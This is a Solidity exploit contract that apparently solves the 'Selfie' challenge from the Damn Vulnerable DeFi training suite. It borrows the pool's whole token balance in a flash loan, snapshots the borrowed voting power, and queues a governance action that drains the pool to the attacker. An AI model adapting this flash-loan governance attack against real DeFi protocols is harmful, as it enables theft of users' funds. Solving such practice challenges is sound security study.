//SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.0;
import "../../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function drainAllFunds(address receiver) external;
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

contract SelfieAttack {
    ISelfiePool pool;
    ISimpleGovernance governance;
    DamnValuableTokenSnapshot DVT;
    address attacker;
    uint public actionId;
    constructor (address _governance, address _pool, address _DVT) {
        pool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        DVT = DamnValuableTokenSnapshot(_DVT);
    }

    function attack(address _attacker) external {
        uint amount = DVT.balanceOf(address(pool));
        attacker = _attacker;
        pool.flashLoan(amount);
    }

    /**
    * @param token no use just to prevent fallback
    * @param amount no use just to prevent fallback
    */
    function receiveTokens(address token, uint256 amount) external {
        DVT.snapshot();
        bytes memory data = abi.encodeWithSelector(ISelfiePool.drainAllFunds.selector, attacker);
        actionId = governance.queueAction(address(pool), data, 0);
        DVT.transfer(address(pool), amount);
    }

    
}